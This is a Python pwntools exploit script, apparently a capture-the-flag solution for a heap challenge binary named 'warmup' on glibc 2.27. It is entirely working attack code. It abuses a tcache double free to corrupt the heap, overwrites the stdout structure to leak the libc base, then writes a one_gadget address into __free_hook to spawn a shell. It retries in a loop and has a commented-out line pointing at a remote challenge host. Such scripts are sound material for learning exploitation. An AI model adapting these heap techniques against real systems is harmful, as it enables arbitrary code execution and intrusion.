# libc 2.27

from pwn import *

context.arch='amd64'
libc = ELF('./libc-2.27.so')

def add(content):
	r.sendlineafter('>>', '1')
	r.sendafter('>>', content)

def delete(idx):
	r.sendlineafter('>>', '2')
	r.sendlineafter(':', str(idx))

def edit(idx, content):
	r.sendlineafter('>>', '3')
	r.sendlineafter(':', str(idx))
	r.sendafter('>>', content)

while True:
	try:
		r = process('./warmup')
		#r = remote('47.52.90.3', 9999)
		add(flat(0, 0x91)) # 0
		add(flat(0, 0x21)) # 1
		delete(1)
		delete(1)
		delete(1)
		add('\x80') # 1(1)
		add('\x80') # 2(1)
		add('fake') # 3(fake 0)
		add('a')    # 4(2) avoid merge
		edit(0, flat(0, 0x51))
		delete(3)
		delete(3)
		delete(3)
		add('fake') # 3(fake 0)
		edit(0, flat(0, 0x91))
		for _ in range(8):
			delete(3)

		edit(0, flat(0, 0x91) + '\x60\x97')
		add('a') # 5(fake 0)
		add(flat(0xfbad1880, 0, 0, 0)+'\x00')  # 6(stdout) 
		print "recving..."
		libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2)-0x3ed8b0
		free_hook = libc_base + libc.symbols['__free_hook']
		print "libc_base @ ", hex(libc_base)
		print "free_hook @ ", hex(free_hook)
		one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
		one_shot = libc_base + one_gadget[1]

		edit(0, flat(0, 0x51))
		delete(3)
		delete(3)
		delete(3)
		edit(0, flat(0, 0x51, free_hook, free_hook))
		add('a') # 6(fake 0)
		add(p64(one_shot)) # 7(free_hook)
		delete(1) # trigger free
		r.interactive()
		break

	except EOFError:
		r.close()
		pass
	except KeyboardInterrupt:
		r.close()
		break

